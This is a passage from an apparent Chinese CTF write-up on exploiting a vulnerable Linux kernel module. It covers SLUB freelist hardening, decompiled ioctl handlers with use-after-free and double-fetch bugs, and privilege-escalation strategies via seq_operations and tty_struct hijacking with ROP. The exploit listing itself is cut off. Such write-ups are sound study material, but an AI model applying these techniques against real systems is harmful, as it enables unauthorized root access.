*/</span></span><br><span class="line"><span class="keyword">int</span> red_left_pad;<span class="comment">/* Left redzone padding size */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *name;<span class="comment">/* Name (only for display!) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span><span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span><span class="comment">/* For sysfs */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line"><span class="keyword">int</span> max_attr_size; <span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">random</span>;   <span class="comment">// ==================== I'm here ==================== //</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>同时在<code>kmem_cache_open</code>中，<code>random</code>进行了初始化：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">s-&gt;<span class="built_in">random</span> = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里有一个奇怪的点就是，这个<code>s-&gt;random</code>在实际调试过程中发现，并不是一个随机值，而是固定不变的，即使内核重启多次。至于具体原因得了解一下<code>get_random_long</code>的实现，先埋个坑。</p><p>重点我们关注在：</p><ul><li><code>set_freepointer</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">    BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  这里引入一个<code>BUG_ON(object == fp);</code>的逻辑，就是说当前被<code>free</code>的object不能等于<code>freelist</code>的第一个object，如果对glibc的ptmalloc中的fastbin实现有了解的话，其实等同于fastbin对double free的检查逻辑。<br>  检查通过后，通过调用<code>freelist_ptr</code>设置object的fd。</li><li><code>freelist_ptr</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;<span class="built_in">random</span> ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  可以看到，存放的fd的值是要经过<code>ptr ^ s-&gt;random ^ ptr_addr</code>计算的，简单来说，就是将<code>current_free_object ^ next_free_object ^ kmem_cache-&gt;random</code>计算出来当作fd储存。</li><li><code>get_freepointer</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">get_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> freelist_dereference(s, object + s-&gt;offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_dereference</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="keyword">void</span> *ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> freelist_ptr(s, (<span class="keyword">void</span> *)*(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(ptr_addr),</span><br><span class="line">                (<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  取<code>next_free_object</code>的时候，也是做同样的异或操作。</li></ul><p>了解了这些函数，我们也不难发现，对fd指针的加密确实给利用带来了不小难度，但是也并非毫无破绽。总的来说，我们无法轻易做到通过覆盖fd来实现任意地址读写，也无法轻易通过读取fd来获取到object的地址。</p><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>老规矩，看开的保护：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">stty intr ^]</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">cd</span> `dirname <span class="variable">$0</span>`</span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 128M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append 'console=ttyS0 loglevel=3 pti=off oops=panic panic=1 nokaslr' \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp 2,cores=2,threads=1 \</span><br><span class="line">    -cpu qemu64,smep 2&gt;/dev/null \</span><br><span class="line">    -s</span><br></pre></td></tr></table></figure><p>只开了smep。<br>分析一下<code>noob.ko</code>，常规的菜单，<code>ioctl</code>提供四个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_436</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">0x30001</span> )</span><br><span class="line">    <span class="keyword">return</span> del_note(a3);</span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0x30001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 == <span class="number">0x30002</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = edit_note(a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( a2 != <span class="number">0x30003</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">      v4 = show_note(a3);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 != <span class="number">0x30000</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    v4 = add_note(a3);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分别是<code>add_note</code>，<code>delete_note</code>，<code>edit_note</code>和<code>show_note</code>。<br>其中：</p><ul><li><code>add_note</code>:  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_48</span><span class="params">(<span class="keyword">unsigned</span> __int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+10h] [rbp-18h]</span></span><br><span class="line">    __int64 v3; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">    v2 = *a1;</span><br><span class="line">    <span class="keyword">if</span> ( a1[<span class="number">2</span>] &gt; <span class="number">0x70</span> || a1[<span class="number">2</span>] &lt;= <span class="number">0x1F</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( v2 &gt; <span class="number">0x1F</span> || pool[v2].ptr )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    v3 = _kmalloc(a1[<span class="number">2</span>], <span class="number">0x14000C0</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    pool[v2].ptr = v3;</span><br><span class="line">    pool[v2].<span class="built_in">size</span> = a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  这里可以发现，不管是做检查<code>a1[2] &gt; 0x70 || a1[2] &lt;= 0x1F</code>还是作为size进行<code>_kmalloc(a1[2], 0x14000C0LL);</code>，还是存放在全局的数组中<code>pool[v2].size = a1[2];</code>，都是直接地访问用户空间的内容。<br>  再加上其实<code>startvm.sh</code>中只开了<code>smep</code>而没有开<code>smap</code>，就铁定存在double fetch了。</li><li><code>delete_note</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_121</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+10h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v2 = pool[*a1].ptr;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 &gt; <span class="number">0x1F</span>uLL )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !v2 )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    kfree(v2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  这里显然是一个UAF，<code>kfree</code>之后没有将全局数组中的相应<code>ptr</code>置0。</li><li><code>show_note</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_185</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+10h] [rbp-48h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">    __int64 v5; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    v2 = *a1;</span><br><span class="line">    v3 = a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)*a1 &gt; <span class="number">0x1F</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !pool[v2].ptr || v3 &gt; pool[v2].<span class="built_in">size</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    v4 = a1[<span class="number">1</span>];</span><br><span class="line">    v5 = pool[v2].ptr;</span><br><span class="line">    _check_object_size(pool[v2].ptr, v3, <span class="number">1L</span>L);</span><br><span class="line">    copy_to_user(v4, v5, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  只是简单地将<code>pool[v2].ptr</code>中的内容复制到用户空间中，可以注意到和<code>add_note</code>中明显不同的是，这里首先把<code>a1[2]</code>的值复制给内核的局部变量<code>v3</code>，之后都是对<code>v3</code>的操作，显然不会有double fetch的问题。</li><li><code>edit_note</code>：  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_2DD</span><span class="params">(__int64 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v2; <span class="comment">// [rsp+10h] [rbp-48h]</span></span><br><span class="line">    <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">    __int64 v4; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">    __int64 v5; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">    v2 = *a1;</span><br><span class="line">    v3 = a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)*a1 &gt; <span class="number">0x1F</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    <span class="keyword">if</span> ( !pool[v2].ptr || v3 &gt; pool[v2].<span class="built_in">size</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">    v4 = pool[v2].ptr;</span><br><span class="line">    v5 = a1[<span class="number">1</span>];</span><br><span class="line">    _check_object_size(pool[v2].ptr, v3, <span class="number">0L</span>L);</span><br><span class="line">    copy_from_user(v4, v5, v3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  将用户空间中的内容复制到<code>pool[v2].ptr</code>中，其实这里也存在一个double fecth的问题，即<code>v2 = *a1;</code>赋值先做，然后再检查<code>(unsigned __int64)*a1 &gt; 0x1F</code>，最后再用<code>v2</code>作为下标取<code>ptr</code>地址。</li></ul><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>这道题虽然存在double fecth的漏洞，但是可以用也可以不同，仅仅利用一个UAF同样可以完成提权。</p><h3 id="double-fetch方法"><a href="#double-fetch方法" class="headerlink" title="double fetch方法"></a>double fetch方法</h3><p>double fetch的方法，就是绕过<code>add_note</code>中对<code>a1[2]</code>也就是size的检查，实现对任意size大小的slub object进行UAF的利用。<br>最简单的做法，就是利用UAF，控制一个<code>size = 0x2e0</code>（也就是题目所给环境下<code>cred</code>结构体的大小）的object。之前我们有在babydriver这道题中提到，进行<code>fork</code>操作的时候，内核会分配一个<code>cred</code>结构题储存子进程的信息，控制一个同样size的object，然后修改cred中的uid，就可以完成提权。</p><p><strong>这里引入第一个坑点：</strong></p><blockquote><p>在利用此方法进行提权的过程中，发现成功率为0，经过马哥的指点和调试，再结合网上的搜到的资料，发现在新版本的内核中，这种方法已经无效了。<br>原因在于，新版本内核中采用了<code>cred_jar</code>这个新的<code>kmem_cache</code>，与<code>kmalloc</code>使用的<code>kmalloc-xx</code>是隔离开的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">init <span class="title">cred_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line">&gt;&#123;</span><br><span class="line"><span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">cred_jar = kmem_cache_create(<span class="string">"cred_jar"</span>, <span class="keyword">sizeof</span>(struct &gt;cred), <span class="number">0</span>,</span><br><span class="line">SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>如果需要刨根问底的话，可以对源码进行调试，按照以下调用路径：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cred_init() ==&gt; __kmem_cache_alloc() ==&gt; __kmem_cache_alias() ==&gt; find_mergeable()</span><br></pre></td></tr></table></figure><p>会发现<code>cred_jar</code>与普通的<code>kmalloc-xx</code>隔离的证据根本在于，进行<code>find_mergeable</code>返回值为0，也就是说<code>cred_jar</code>与<code>kmalloc-xx</code>是<code>unmergeable</code>的。</p></blockquote><p>虽然在搜相关writeup的过程中，还是有搜到以这种方式写的exp，对此我表示怀疑，建议自行验证。</p><p>所以需要寻找另一条路，即可以同样仿照babydriver这题的rop做法，去劫持<code>tty_struct</code>，一大堆指针可以用来劫持控制流，然后做rop，提权，这里就不赘述了。</p><h3 id="单纯的UAF方法"><a href="#单纯的UAF方法" class="headerlink" title="单纯的UAF方法"></a>单纯的UAF方法</h3><p>何为单纯的UAF做法？在本题中，既然在不考虑double fetch的前提下，只能做到对<code>0x20-0x80</code>的object进行UAF利用，那么我们就可以只在这个范围内，达到提权的目的。</p><p>这里引入一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">stop</span>) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line"><span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line"><span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>存在四个函数指针，简直不要太好用；抛开这题不谈，其他题目中，用这个结构体来进行leak或者劫持pc，简直不能再方便。<br>首先了解一下这个<code>seq_operations</code>存在的意义是什么，什么时候会存在：<br>因为对proc文件系统进行读取的时候，限制了一次最多读一页，如果超过那么只能多次读取，这样就会增加读取次数从而增加系统调用的次数，影响了效率。所以出现了<code>seq_file</code>的序列文件出现，该功能使得对于读取大文件更加容易。<br>至于其中更深层次的细节，我这里就不赘述了，总而言之，试图读取proc文件系统中的文件时，会创建一个<code>seq_file</code>结构体，作为这个结构体成员的<code>seq_operations</code>也相应产生。<br>在打开一个序列文件的时候会调用<code>seq_open</code>，之后读取文件内容时，<code>seq_operations</code>的执行顺序为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start() ==&gt; next() ==&gt; show() ==&gt; ... ==&gt; next() ==&gt; show() ==&gt; <span class="built_in">stop</span>();</span><br></pre></td></tr></table></figure><p>也就是说，会先调用<code>start</code>，然后执行<code>show</code>，接下来判断<code>next</code>是否为空，若非空继续<code>show</code>，若空则<code>stop</code>。</p><p>于是，从利用的角度来讲，如果打开一个proc文件，比如<code>/proc/self/stat</code>，然后控制<code>seq_opeartions-&gt;start</code>为<code>xchg eax, esp; ret;</code>类似的栈迁移gadget，再进行后续的rop提权即可。</p><p><strong>这里引入第二个坑点：</strong></p><blockquote><p>如果你尝试通过一个UAF object达到对<code>seq_operations</code>的控制，你会怀疑这个结构体是否真实存在。<br>事实是，在编写exp并且调试的过程中发现，打开一个proc文件之后，总是第二个0x20的object被分配给<code>seq_operations</code>使用，但是我并没有深究第一个是被谁申请的，也并不清楚这在所有内核版本中是否是通用的情况。<br>而最保险的方法就是，多准备几个UAF的object，在分配了<code>seq_operations</code>之后，打印出第一个成员也就是<code>start</code>的地址进行验证。</p></blockquote><p>这样exp就非常简单了，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 